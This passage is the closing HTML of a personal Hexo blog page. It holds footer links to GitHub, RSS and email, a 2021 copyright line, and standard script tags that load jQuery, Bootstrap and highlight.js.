};</script></div></div></div><footer><div class="container beautiful-jekyll-footer"><div class="row"><div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"><ul class="list-inline text-center footer-links"><li><a href="https://brooke-hub.github.io" title="GitHub"><span class="fa-stack fa-lg"><i class="fa fa-circle fa-stack-2x"></i><i class="fa fa-stack-1x fa-inverse fa-github"></i></span></a></li><li><a href="/atom.xml" title="RSS"><span class="fa-stack fa-lg"><i class="fa fa-circle fa-stack-2x"></i><i class="fa fa-stack-1x fa-inverse fa-rss"></i></span></a></li><li><a href="mailto:bisyao@gmail.com" title="Email me"><span class="fa-stack fa-lg"><i class="fa fa-circle fa-stack-2x"></i><i class="fa fa-stack-1x fa-inverse fa-envelope"></i></span></a></li></ul><p class="copyright text-muted">© WendyJellyBeans • 2021 • <a href="mailto:undefined"></a>
</p><p class="theme-by text-muted">Theme by
<a target="_blank" rel="noopener" href="https://github.com/twoyao/beautiful-hexo">beautiful-hexo</a></p></div></div></div></footer><script src="//cdn.bootcss.com/jquery/1.11.2/jquery.min.js"></script><script src="//cdn.bootcss.com/bootstrap/3.3.7/js/bootstrap.min.js"></script><script src="/js/main.js"></script><script src="//cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script><script>hljs.initHighlightingOnLoad();</script></body></html>